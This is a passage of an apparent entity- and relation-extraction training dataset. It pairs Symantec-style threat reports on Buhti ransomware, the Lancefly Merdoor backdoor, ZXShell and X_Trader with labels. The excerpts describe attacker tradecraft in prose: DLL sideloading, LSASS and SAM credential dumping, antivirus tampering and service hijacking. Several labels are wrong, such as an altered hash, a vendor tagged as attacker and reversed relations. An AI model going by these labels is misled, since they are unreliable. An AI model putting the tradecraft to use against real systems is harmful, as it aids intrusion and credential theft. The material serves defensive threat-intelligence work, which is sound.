malware), (CVE-2023-34362, vulnerability), (Clop ransomware, malware)\nRelationships: (group, exploit, CVE-2023-0669), (Clop ransomware, exploit, CVE-2023-34362)"}
{"instruction": "Buhti: New Ransomware Operation Relies on Repurposed Payloads", "input": null, "output": "Named Entities: (Buhti, malware), (Ransomware, threat type)\nRelationships: (Buhti, belong to, Ransomware)"}
{"instruction": "Attackers use rebranded variants of leaked LockBit and Babuk ransomware payloads but use own custom exfiltration tool. A relatively new ransomware operation calling itself Buhti appears to be eschewing developing its own payload and is instead utilizing variants of the leaked LockBit and Babuk ransomware families to attack Windows and Linux systems. While the group doesn\u2019t develop its own ransomware, it does utilize what appears to be one custom-developed tool, an information stealer designed to search for and archive specified file types. Buhti, which first came to public attention in February 2023, was initially reported to be attacking Linux computers. However, Symantec\u2019s Threat Hunter Team has also uncovered attempts to attack Windows computers on compromised networks.", "input": null, "output": "Named Entities: (LockBit, malware), (Babuk, malware), (Buhti, malware), (ransomware, threat type), (information stealer, tool)\nRelationships: (Buhti, use, LockBit), (Buhti, use, Babuk), (Buhti, belong to, ransomware), (Buhti, use, information stealer)"}
{"instruction": "The group appears to be quick to exploit recently disclosed vulnerabilities, with one recent attack exploiting the recently patched PaperCut vulnerability. Since Buhti hasn\u2019t been linked to any known cyber-crime group, Symantec has assigned the actor name Blacktail to its operators.", "input": null, "output": "Named Entities: (Buhti, malware), (Blacktail, attacker)\nRelationships: (Buhti, assign, Blacktail)"}
{"instruction": "LockBit rebrand A recent Buhti attack saw the attackers attempt to deploy a ransomware payload against Windows computers on the targeted network. Analysis of the payload revealed that it was a minimally modified version of the leaked LockBit 3.0 (aka LockBit Black) ransomware. Encrypted files are appended with a .buthi extension. The ransom note can be seen in Figure 1. Figure 1. Buhti ransom note The ransomware includes a feature that drops a LockBit-branded .bmp file (Figure 2) and makes it the Windows wallpaper, but this functionality was disabled by the attackers. Figure 2. Embedded LockBit-branded BMP file found in Buhti payload The ransomware also has the capability to send system information about the infected computer to a command-and-control (C&C) server, but this functionality is also disabled and no C&C server is specified.", "input": null, "output": "Named Entities: (Buhti, malware), (ransomware, threat type), (LockBit 3.0, malware), (LockBit Black, malware)\nRelationships: (Buhti, belong to, ransomware), (Buhti, modified version of, LockBit 3.0), (LockBit 3.0, belong to, ransomware), (LockBit 3.0, aka, LockBit Black)"}
{"instruction": "LockBit 3.0 was developed for the Syrphid cyber-crime group (aka Bitwise Spider), which is the operator of the LockBit ransomware. The builder for the ransomware was leaked in September 2022 , allegedly by a disgruntled developer.", "input": null, "output": "Named Entities: (LockBit 3.0, malware), (Syrphid, attacker), (Bitwise Spider, attacker), (LockBit, malware)\nRelationships: (LockBit 3.0, developed for, Syrphid), (Syrphid, aka, Bitwise Spider), (Syrphid, operator of, LockBit)"}
{"instruction": "Babuk repurposed \nWhile Buhti came to public attention for targeting Linux machines with a payload written in Golang, analysis by Symantec of multiple Linux payloads found that they were all variants of the leaked Babuk ransomware. \nBabuk was one of the first ransomware actors to target ESXi systems with a Linux payload. Babuk\u2019s source code was leaked in 2021 and since then has been adopted and reused by multiple ransomware operations. \nThe ransom note dropped by Linux variants was identical to that of the Windows payload; with only the payment address differing.", "input": null, "output": "Named Entities: (Babuk, malware), (Buhti, malware), (ransomware, threat type)\nRelationships: (Babuk, repurpose, Buhti), (Babuk, belong to, ransomware)"}
{"instruction": "Exfiltration tool \nBlacktail does appear to use at least one piece of custom malware, a data-exfiltration tool (SHA256: 9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd). \nWritten in Golang, it is designed to steal the following file types: .pdf, .php, .png, .ppt, .psd, .rar, .raw, .rtf, .sql, .svg, .swf, .tar, .txt, .wav, .wma, .wmv, .xls, .xml, .yml, .zip, .aiff, .aspx, .docx, .epub, .json, .mpeg, .pptx, .xlsx, .yaml. Copied files are placed into a .zip archive, which is created using an open source utility called zip . \nThe tool can be configured via command-line arguments to specify both the directory to search for files of interest in and the name of the output archive. The -o argument in the command line specifies the archive to be created. The -d argument specifies the directory to search for files of interest in. For example: \nCSIDL_WINDOWS\\temp\\xhfw.exe -o CSIDL_WINDOWS\\temp\\output.zip -d CSIDL_PROFILE", "input": null, "output": "Named Entities: (Blacktail, attacker), (custom malware, malware), (9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd, SHA256)\nRelationships: (Blacktail, use, custom malware), (custom malware, hash, d9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd)"}
{"instruction": "Vulnerability exploitation \nRecent Buhti attacks exploited a recently discovered vulnerability in PaperCut NG and MF ( CVE-2023-27350 ). The exploit allows an attacker to bypass authentication and remotely execute code. The vulnerability was disclosed and patched by PaperCut on March 15, 2023, and in recent weeks multiple threat actors have begun utilizing the exploit against unpatched systems. \nThe attackers exploited the vulnerability in order to install Cobalt Strike, Meterpreter, Sliver, AnyDesk, and ConnectWise. The tools were leveraged to steal data from, and deliver the ransomware payload to, multiple computers on the targeted network. \nBlacktail appears quick to utilise new exploits. In February, they were reported to be exploiting a vulnerability in IBM\u2019s Aspera Faspex file-exchange application ( CVE-2022-47986 ).", "input": null, "output": "Named Entities: (Buhti, malware), (CVE-2023-27350, vulnerability), (Cobalt Strike, tool), (Meterpreter, tool), (Sliver, tool), (AnyDesk, tool), (ConnectWise, tool), (Blacktail, attacker), (CVE-2022-47986, vulnerability)\nRelationships: (Buhti, exploit, CVE-2023-27350), (Buhti, install, Cobalt Strike), (Buhti, install, Meterpreter), (Buhti, install, Sliver), (Buhti, install, AnyDesk), (Buhti, install, ConnectWise), (Blacktail, exploit, CVE-2022-47986)"}
{"instruction": "Dangerous adversary \nWhile the reuse of leaked payloads is often the hallmark of a less-skilled ransomware operation, Blacktail\u2019s general competence in carrying out attacks, coupled with its ability to recognize the utility of newly discovered vulnerabilities, suggests that it is not to be underestimated.", "input": null, "output": "Named Entities: (Blacktail, attacker), (ransomware, threat type)\nRelationships: (Blacktail, carry out, ransomware attack)"}
{"instruction": "Lancefly: Group Uses Custom Backdoor to Target Orgs in Government, Aviation, Other Sectors", "input": null, "output": "Named Entities: (Lancefly, attacker), (Custom Backdoor, tool)\nRelationships: (Lancefly, uses, Custom Backdoor)"}
{"instruction": "Merdoor backdoor is low prevalence and used in highly targeted attacks. The Lancefly advanced persistent threat (APT) group is using a custom-written backdoor in attacks targeting organizations in South and Southeast Asia, in activity that has been ongoing for several years. Lancefly may have some links to previously known groups, but these are low confidence, which led researchers at Symantec, by Broadcom Software , to classify this activity under a new group name. Lancefly\u2019s custom malware, which we have dubbed Merdoor, is a powerful backdoor that appears to have existed since 2018. Symantec researchers observed it being used in some activity in 2020 and 2021, as well as this more recent campaign, which continued into the first quarter of 2023. The motivation behind both these campaigns is believed to be intelligence gathering.", "input": null, "output": "Named Entities: (Merdoor, malware), (Lancefly, attacker)\nRelationships: (Lancefly, use, backdoor)"}
{"instruction": "The backdoor is used very selectively, appearing on just a handful of networks and a small number of machines over the years, with its use appearing to be highly targeted. The attackers in this campaign also have access to an updated version of the ZXShell rootkit. The targets in this most recent activity, which began in mid-2022 and continued into 2023, are based in South and Southeast Asia, in sectors including government, aviation, education, and telecoms. Symantec researchers previously saw the Merdoor backdoor used in activity that targeted victims in the same geographies in the government, communications, and technology sectors in 2020 into 2021. Like this recent activity, that activity also appeared to be highly targeted, with only a small number of machines infected.", "input": null, "output": "Named Entities: (ZXShell rootkit, tool), (Merdoor backdoor, malware)\nRelationships: (Merdoor backdoor, access to, ZXShell rootkit)"}
{"instruction": "Merdoor Backdoor Merdoor is a fully-featured backdoor that appears to have been in existence since 2018. The backdoor contains the following functionality: Installing itself as a service Keylogging A variety of methods to communicate with its command-and-control (C&C) server (HTTP, HTTPS, DNS, UDP, TCP) Ability to listen on a local port for commands Instances of the Merdoor backdoor are usually identical with the exception of embedded and encrypted configuration, which determines: C&C communication method Service details Installation directory Typically, the backdoor is injected into the legitimate processes perfhost.exe or svchost.exe. The Merdoor dropper is a self-extracting RAR (SFX) that contains three files: A legitimate and signed binary vulnerable to DLL search-order hijacking A malicious loader (Merdoor loader) An encrypted file (.pak) containing final payload (Merdoor backdoor) When opened, the dropper extracts embedded files and executes a legitimate binary in order to load the Merdoor loader.", "input": null, "output": "Named Entities: (Merdoor, malware), (perfhost.exe, file), (svchost.exe, file), (Merdoor loader, tool)\nRelationships: (backdoor, injected into, perfhost.exe), (backdoor, injected into, svchost.exe)"}
{"instruction": "Merdoor dropper variants have been found that abuse older versions of five different legitimate applications for the purpose of DLL sideloading: Table 1. List of legitimate applications abused by Merdoor for DLL sideloading. Legitimate binary Version Date signed Loader (Merdoor loader) Encrypted payload (Merdoor backdoor) SiteAdv.exe (McAfee SiteAdvisor) 1.6.0.23 08/10/2006 SiteAdv.dll SiteAdv.pak ssr32.exe (Sophos SafeStore Restore) 1.3.0.1 11/17/2017 safestore32.dll safestore.pak chrome_frame_helper.exe (Google Chrome Frame) 27.0.1453.110 05/29/2013 chrome_frame_helper.dll chrome_frame_helper.pak wsc_proxy.exe (Avast wsc_proxy) 1.0.0.3 10/28/2019 wsc.dll proxycfg.pak coInst.exe (Norton Identity Safe) 2014.7.3.12 06/26/2014 msvcr100.dll coinstcfg.dat", "input": null, "output": "Named Entities: (Merdoor, malware), (SiteAdv.exe, file), (SiteAdv.dll, file), (SiteAdv.pak, file), (ssr32.exe, file), (safestore32.dll, file), (safestore.pak, file), (chrome_frame_helper.exe, file), (chrome_frame_helper.dll, file), (chrome_frame_helper.pak, file), (wsc_proxy.exe, file), (wsc.dll, file), (proxycfg.pak, file), (coInst.exe, file), (msvcr100.dll, file), (coinstcfg.dat, file)\nRelationships: (Merdoor, abuse, SiteAdv.exe), (Merdoor, abuse, SiteAdv.dll), (Merdoor, abuse, SiteAdv.pak), (Merdoor, abuse, ssr32.exe), (Merdoor, abuse, safestore32.dll), (Merdoor, abuse, safestore.pak), (Merdoor, abuse, chrome_frame_helper.exe), (Merdoor, abuse, chrome_frame_helper.dll), (Merdoor, abuse, chrome_frame_helper.pak), (Merdoor, abuse, wsc_proxy.exe), (Merdoor, abuse, wsc.dll), (Merdoor, abuse, proxycfg.pak), (Merdoor, abuse, coInst.exe), (Merdoor, abuse, msvcr100.dll), (Merdoor, abuse, coinstcfg.dat)"}
{"instruction": "Attack Chain Evidence from Lancefly\u2019s earlier campaign that began in 2020 suggested that in that instance the group may have used a phishing email with a lure based on the 37th ASEAN Summit as an initial infection vector. In this more recent activity, the initial infection vector was not entirely clear. We saw some indications of what the initial infection vector may have been in two victims, though this was not conclusive. In one of the government sector victims, there were indications that the initial infection vector may have been SSH brute forcing. Multiple open-source sources associate one of the IP addresses used by the threat actors in this activity with SSH brute forcing, indicating that the initial infection vector was possibly SSH brute forcing.", "input": null, "output": "Named Entities: (Lancefly, attacker)\nRelationships: No related relations."}
{"instruction": "In another victim, a file path ( Csidl_program_files\\loadbalancer\\ibm\\edge\\lb\\servers\\bin ) indicates a load balancer may have been exploited for access, indicating that the initial infection vector may have been an exposed public-facing server. While evidence for any of these infection vectors is not definitive, it does appear to indicate that Lancefly is adaptable when it comes to the kind of infection vectors it uses. Credential theft using non-malware techniques In activity that also aligned with their earlier campaign in 2020/2021, the attackers used a number of non-malware techniques for credential theft on victim machines: PowerShell was used to launch rundll32.exe in order to dump the memory of a process using the MiniDump function of comsvcs.dll. This technique is often used to dump LSASS memory. Reg.exe was used to dump the SAM and SYSTEM registry hives. A legitimate tool by Avast was installed by the attackers and used to dump LSASS memory.", "input": null, "output": "Named Entities: (Lancefly, attacker), (PowerShell, tool), (rundll32.exe, file), (comsvcs.dll, file), (Reg.exe, file), (Avast, tool)\nRelationships: (Lancefly, use, PowerShell), (PowerShell, used to launch, rundll32.exe), (rundll32.exe,use, comsvcs.dll), (Lancefly, install, Avast)"}
{"instruction": "The attackers also used a masqueraded version of the legitimate archiving tool WinRAR to stage and encrypt files before exfiltration. Notable attack chain tools and TTPs Impacket Atexec: A dual-use tool that can be used by malicious actors to create and run an immediate scheduled task on a remote target via SMB in order to execute commands on a target system. It is used by Lancefly for lateral movement across victim networks, also possibly for shellcode execution and evasion. It may have been used to delete cmdline output files. Suspicious SMB activity: Suspicious SMB activity is seen on numerous victim machines. This is likely related to the use of Impacket by the threat actors.", "input": null, "output": "Named Entities: (WinRAR, tool), (Impacket Atexec, tool), (Lancefly, attacker)\nRelationships: (Lancefly, use, Impacket Atexec)"}
{"instruction": "WinRAR: An archive manager that can be used to archive or zip files \u2013 for example, prior to exfiltration. It is not clear how the attackers exfiltrate the data from victim machines, but it is most likely via Merdoor. LSSAS Dumper: Allows the attackers to swiftly steal credentials they can then use to gain further access across victim networks. NBTScan: Open-source command-line NetBIOS scanner . This can be used to gather information on a network. Blackloader and Prcloader: Loaders used by the group. These loaders were also both used in earlier Merdoor activity in 2020 and 2021. They have been linked to the delivery of PlugX. Both loaders appear to be sideloaded onto victim machines. It is not clear if these loaders are exclusively used by Lancefly or if their use is shared across multiple groups.", "input": null, "output": "Named Entities: (WinRAR, tool), (Merdoor, malware), (LSSAS Dumper, tool), (NBTScan, tool), (Blackloader, tool), (Prcloader, tool), (PlugX, malware), (Lancefly, attacker)\nRelationships: (Merdoor, is used by, Lancefly), (LSSAS Dumper,  is used by, Lancefly), (NBTScan, is used by, Lancefly), (Blackloader, is used by, Lancefly), (Prcloader, is used by, Lancefly), (Blackloader, is linked to, PlugX), (Prcloader, is linked to, PlugX)"}
{"instruction": "A typical Merdoor attack chain, as seen in one of the victims, appears to be: Merdoor injected into either perfhost.exe or svchost.exe. Suspicious SMB activity is then normally observed, and the backdoor connects to its C&C server. This is often followed by suspicious living-off-the-land activity, such as the execution of commands like mavinject.exe (which can be used for process injection) and createdump.exe (which can be used to dump a process e.g. LSASS). A masqueraded WinRAR (wmiprvse.exe) file is then used to stage and encrypt files, presumably prior to exfiltration. We do not actually see the files being exfiltrated from victim networks, but we presume the Merdoor backdoor itself is used to exfiltrate them.", "input": null, "output": "Named Entities: (Merdoor, malware), (perfhost.exe, file), (svchost.exe, file), (mavinject.exe, file), (createdump.exe, file), (WinRAR, tool), (wmiprvse.exe, file)\nRelationships: (Merdoor, inject, perfhost.exe), (Merdoor, inject, svchost.exe), (Merdoor, use, mavinject.exe), (Merdoor, use, createdump.exe), (WinRAR, masquerade, wmiprvse.exe), (Merdoor, stage, WinRAR)"}
{"instruction": "ZXShell Rootkit Technical Details The ZXShell rootkit was first reported on by Cisco in 2014 , but the version of the tool used by Lancefly is updated, indicating that it continues to be actively developed. The source code of this rootkit is publicly available so it may be used by multiple different groups. The new version of the rootkit used by Lancefly appears to be smaller in size, while it also has additional functions and targets additional antivirus software to disable. Loader The loader for the rootkit is a 32-bit DLL with the export directory name \"FormDll.dll\" (SHA256: 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7). It has the following exports: \"CallDriver\" \"DoRVA\" \"KillAvpProcess\" \"LoadSys\" \"ProtectDllFile\" Export \"Loadsys\" Whenever the export \"LoadSys\" is executed, it drops one of the following files based on the processor architecture: \"[WindowsDirectory]\\system32\\drivers\\TdiProxy.sys\" \"[WindowsDirectory]\\system64\\drivers\\TdiProxy.sys\"", "input": null, "output": "Named Entities: (ZXShell Rootkit, malware), (Lancefly, attacker), (FormDll.dll, file), (1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7, SHA256), (TdiProxy.sys, file)\nRelationships: (Lancefly, use, ZXShell Rootkit), (ZXShell Rootkit, export, FormDll.dll), (FormDll.dll, hash, 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7), (FormDll.dll, drop, TdiProxy.sys)"}
{"instruction": "These files are a malicious Windows Kernel driver. This is a variant of a driver that was first documented in an RSA blog several years ago. It has the PDB filename: \"c:\\google\\objchk_win7_amd64\\amd64\\Google.pdb\" The sample creates the device: \"\\Device\\TdiProxy0\". It also creates the symbolic link \"\\DosDevices\\TdiProxy0\", so that it can be controlled using the pathname \u201c \\\\.\\TdiProxy0\u201d. After this, the loader timestamps the dropped file by copying the timestamps from the file \"[WindowsDirectory]\\system32\\drivers\\http.sys\". Then it creates a service with the following parameters: ServiceName = \"TdiProxy0\" DisplayName = \"TdiProxy0\" (later replaced with \"TdiProxy\") BinaryPathName = \"[WindowsDirectory]\\system32\\drivers\\TdiProxy.sys\" Export \"CallDriver\" \"CallDriver\" opens the following device, which was created by the \u201c \\\\.\\TdiProxy0\u201d malicious kernel driver. It communicates with it using the DeviceIoControl API. The export expects two arguments. The first argument determines the dwIoControlCode parameter to use when calling the DeviceIoControl API and it should be one of the following strings: \"-init\", \"-file\", \"-pack\",", "input": null, "output": "No realted named entities and relationships."}
{"instruction": "Next, it sets the following registry value: HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.ptdf\\\"ptdffile\" = \"[file_path_of_the_DLL]\" Loadpoint This is a 32-bit executable with the PDB filename: \"M:\\Project\\database\\10.0.18362\\Form\\Release\\Form.pdb\". (SHA256: 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e) Whenever the sample is executed, it loads the following DLL: \"[file_path_of_the_running_executable]\\FormDll.dll\" It also calls its export: \"DoRVA\". Installation and Update Utility The installation and update utility is a 32-bit PE executable (SHA256: a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221) that shares small but distinctive fragments of code with the Merdoor loader, which is what indicates they are part of the same toolset. Whenever the sample is executed, it attempts to read and delete the following file containing its configuration data: \"[file_directory_of_running_executable]\\res.ini\" Update functionality Next, it checks that: \"\\\\.\\TdiProxy0\" device is available, and That its own process was started with the command-line parameter \"-up\". If both checks pass, the sample attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. For example, it may terminate the processes \"egui.exe\", \"ekrn.exe\", and \"msmpeng.exe\".", "input": null, "output": "Named Entities: (Loadpoint, tool), (Form.pdb, file), (180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e, SHA256), (FormDll.dll, file),  (DoRVA, tool), (a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221,SHA256), (Merdoor loader, tool), (res.ini, file), (TdiProxy0, tool), (egui.exe, file), (ekrn.exe, file), (msmpeng.exe,file)\nRelationships: (Loadpoint, file, Form.pdb), (Form.pdb, hash, 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e), (Form.pdb, load, FormDll.dll), (Form.pdb, call, DoRVA), (DoRVA, hash, a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221), (DoRVA, the same toolset, Merdoor loader), (DoRVA, read and delete, res.ini), (DoRVA, read and delete, \\TdiProxy0), (DoRVA, terminate, egui.exe), (DoRVA, terminate, ekrn.exe), (DoRVA, terminate, msmpeng.exe)"}
{"instruction": "Next, it attempts to rename the file \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.dat\" as one of the following (depending on the Windows version): \"[SystemDrive]\\Users\\All Users\\Windows Defender\\temp.temp\" \"[WindowsDirectory]\\temp.temp\". Based on the structure of the code, the above file should start with the magic string \"AP32\" and could contain a DLL file in compressed form. The sample then decompresses the renamed file \"temp.temp\". When decompressing, it may create the temporary file \"temp.temp.pack\" in the same folder. Next, the sample appends a certain marker followed by the content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file. Additionally, it also creates the following registry value: HKEY_CLASSES_ROOT\\.udf\\\"BINTYPE\" = [content of \"[file_directory_of_running_executable]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12)] Then the sample checks if the following file exists: \"[SystemDrive]\\Users\\All Users\\Windows Defender\\DefenderSvc.dll\"", "input": null, "output": "Named Entities: (res.dat, file), (temp.temp, file), (temp.temp.pack, file), (res.ini, file), (DefenderSvc.dll, file)\nRelationships: (res.dat, rename, temp.temp), (temp.temp, append, res.ini), (DefenderSvc.dll, exist, file)"}
{"instruction": "If so, the sample renames the updated \"temp.temp\" file to replace it. Otherwise, it checks the following registry value for the pathname to replace: HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.ecdf\\\"ecdffile\" If that fails, it uses a default from configuration data. Finally, it checks the following registry value for a service name: HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.tudf\\\"tudffile\" It restarts the referred service. Installation functionality The sample attempts to decompress the following file: \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\google64.p\" (64-bit processor architecture), or \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\google32.p\" (32-bit processor architecture) as: \"[WindowsDirectory]\\Microsoft.NET\\Framework64\\iesockethlp.dll\" (64-bit processor architecture), or \"[WindowsDirectory]\\Microsoft.NET\\Framework\\iesockethlp.dll\" (32-bit processor architecture) Then it may modify one of the following registry values to hijack the corresponding service: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\exfat\\\"ImagePath\" = \"\\??\\[PATHNAME_OF_FILE_DECOMPRESSED_ABOVE]\", or HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\RDPWD\\\"ImagePath\" = \"\\??\\[PATHNAME_OF_FILE_DECOMPRESSED_ABOVE]\" Next, it starts the corresponding service and then removes the registry value. It then attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. It then creates a service with the following parameters: ServiceName: \"[PER CONFIGURATION DATA]\" ImagePath: \"%SystemRoot%\\System32\\svchost.exe -k netsvcs\", or \"%SystemRoot%\\System32\\svchost.exe -k ntmssvcs\" Parameters:", "input": null, "output": "Named Entities: (temp.temp, file), (TdiProxy0, tool)\nRelationships: (temp.temp, use, TdiProxy0)"}
{"instruction": "ServiceDll: \"C:\\WINDOWS\\Microsoft.NET\\Framework64\\[PER CONFIGURATION DATA]\", or \"C:\\WINDOWS\\Microsoft.NET\\Framework\\[PER CONFIGURATION DATA]\" Then it creates the following registry value: HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.tudf\\\"tudffile\" = [NAME OF CREATED SERVICE] It then deletes the following registry values: HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.ptdf\\\"ptdffile\" HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.ecdf\\\"ecdffile\" Next, it renames the following file: \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.dat\" as: \"[WindowsDirectory]\\Microsoft.NET\\Framework64\\[PER CONFIGURATION DATA].back\" (64-bit processor architecture), or \"[WindowsDirectory]\\Microsoft.NET\\Framework\\[PER CONFIGURATION DATA].back\" (32-bit processor architecture) Based on the structure of the code, the above file should start with the magic string \"AP32\" and could contain a DLL file in compressed form (using aPLib for compression). The sample then decompresses the renamed \"[PER CONFIGURATION DATA].back\" as \"[PER CONFIGURATION DATA]\". Next, the sample appends a certain marker followed by the content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file. Additionally, it also creates the following registry value: HKEY_CLASSES_ROOT\\.udf\\\"BINTYPE\" = [content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12)]", "input": null, "output": "No related entities and relations."}
{"instruction": "Finally, when the configuration data includes the option \"OneSelfKey\", it makes a compressed copy of its own executable as (using aPLib for compression): \"[WindowsDirectory]\\SysWOW64\\nethlp.hlp\" (64-bit processor architecture), or \"[WindowsDirectory]\\system32\\nethlp.hlp\" (32-bit processor architecture). Some samples include an embedded archive with the final payload: \"Msrpcsvc.dll\" This is a variant of the ZXShell backdoor (SHA256: d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849).", "input": null, "output": "Named Entities: (ZXShell, malware), (Msrpcsvc.dll, file), (d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849, SHA256)\nRelationships: (ZXShell, variant, Msrpcsvc.dll), (Msrpcsvc.dll, hash, d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849)"}
{"instruction": "Possible Links to Other Groups The ZXShell rootkit used by Lancefly is signed by the certificate \"Wemade Entertainment Co. Ltd\", which was previously reported to be associated with APT41 (aka Blackfly/Grayfly). However, it is known that Chinese APT groups, such as APT41, often share certificates with other APT groups. The ZXShell backdoor has also previously been used by the HiddenLynx/APT17 group, but as the source code of ZXShell is now publicly available this does not provide a definitive link between these two groups.", "input": null, "output": "Named Entities: (ZXShell, tool), (Lancefly, attacker), (APT41, attacker), (Blackfly/Grayfly, attacker), (HiddenLynx/APT17, attacker)\nRelationships: (ZXShell, used by, Lancefly), (ZXShell, used by, HiddenLynx/APT17)"}
{"instruction": "Also notable is that the ZXShell rootkit loader component has the name \"formdll.dll\" and it has the ability to read the file \"Form.hlp\" and execute its contents as shellcode. Those same files were mentioned as being used in a previous report detailing activity by the Iron Tiger (aka Budworm/APT27) group . In that case, the attackers used these filenames when loading the PlugX backdoor onto victim machines. The prevalence of such files is very low, which may indicate a potential link between that campaign and this more recent activity. PlugX is also seen being used by Lancefly. PlugX is a remote access Trojan (RAT) with multiple functionalities including backdoor access and data exfiltration. PlugX has existed for well over a decade. It was originally used by Chinese APT groups, but its use is now very widespread, meaning it is difficult to use it as a way of attributing activity.", "input": null, "output": "Named Entities: (ZXShell, malware), (formdll.dll, file), (Form.hlp, file), (Iron Tiger, attacker), (Budworm, attacker), (APT27, attacker), (PlugX, malware), (Lancefly, attacker), (remote access Trojan (RAT), threat type), (Chinese APT groups, attacker)\nRelationships:  (ZXShell, has, formdll.dll), (ZXShell, read, Form.hlp), (Iron Tiger, link to, formdll.dll), (Iron Tiger, aka, Budworm), (Iron Tiger, aka, APT27), (Iron Tiger, load, PlugX), (PlugX, belong to, remote access Trojan (RAT)), (PlugX, used by, Chinese APT groups), (PlugX, used by, Lancefly)"}
{"instruction": "ShadowPad is also used by these attackers. ShadowPad is a modular RAT believed to be exclusively used by Chinese APT groups. Its capabilities are similar to PlugX, and it is often referred to as a successor to that malware. While these overlaps and shared tools may indicate some links between Lancefly activity and activity by other APT groups, none of the overlaps are strong enough to attribute this activity and the development of the Merdoor backdoor to an already-known attack group.", "input": null, "output": "Named Entities: (ShadowPad, malware), (RAT, threat type), (Chinese APT groups, attacker), (PlugX, malware), (Lancefly, attacker), (Merdoor, malware)\nRelationships: (ShadowPad, is used by, attackers), (ShadowPad, belong to, RAT), (Chinese APT groups, use, ShadowPad), (ShadowPad, successor to, PlugX)"}
{"instruction": "Noteworthy Backdoor, Targeted Activity This recent Lancefly activity is of note due to its use of the Merdoor backdoor, but also the low prevalence of this backdoor and the seemingly highly targeted nature of these attacks. While the Merdoor backdoor appears to have been in existence for several years, it appears to only have been used in a small number of attacks in that time period. This prudent use of the tool may indicate a desire by Lancefly to keep its activity under the radar.", "input": null, "output": "Named Entities: (Lancefly, attacker), (Merdoor, tool)\nRelationships: (Lancefly, use, Merdoor)"}
{"instruction": "The tools used and sectors targeted all point to the motivations of this attack campaign being intelligence gathering. The similarities between this recent activity and earlier activity by Lancefly indicate that the group perhaps did not realize the earlier activity had been discovered, so it was not concerned about links being made between the two. Whether or not the exposure of this activity will lead to any alteration in how the group carries out its activity remains to be seen.", "input": null, "output": "Named Entities: (Lancefly, attacker)\nRelationships: No related relations."}
{"instruction": "X_Trader Supply Chain Attack Affects Critical Infrastructure Organizations in U.S. and Europe", "input": null, "output": "Named Entities: (X_Trader, malware), (Supply Chain Attack, threat type)\nRelationships: (X_Trader, for, Supply Chain Attack)"}
{"instruction": "North Korean-linked operation affected more organizations beyond 3CX, including two critical infrastructure organizations in the energy sector. The X_Trader software supply chain attack affected more organizations than 3CX. Initial investigation by Symantec\u2019s Threat Hunter Team has, to date, found that among the victims are two critical infrastructure organizations in the energy sector, one in the U.S. and the other in Europe. In addition to this, two other organizations involved in financial trading were also breached. As reported yesterday by Mandiant , Trojanized X_Trader software was the cause of the 3CX breach, which was uncovered last month. As a result of this breach, 3CX\u2019s software was compromised, with many customers inadvertently downloading malicious versions of the company\u2019s voice and video calling software DesktopApp. In addition to wider victims, Symantec has also discovered additional indicators of compromise, listed below.", "input": null, "output": "Named Entities: (3CX, tool), (X_Trader, malware)\nRelationships: (X_Trader, breach, 3CX)"}
{"instruction": "It appears likely that the X_Trader supply chain attack is financially motivated, since Trading Technologies, the developer of X_Trader, facilitates futures trading, including energy futures. Nevertheless, the compromise of critical infrastructure targets is a source of concern. North Korean-sponsored actors are known to engage in both espionage and financially motivated attacks and it cannot be ruled out that strategically important organizations breached during a financial campaign are targeted for further exploitation.", "input": null, "output": "Named Entities: (X_Trader, tool), (Trading Technologies, attacker)\nRelationships: (Trading Technologies, developer,  X_Trader)"}
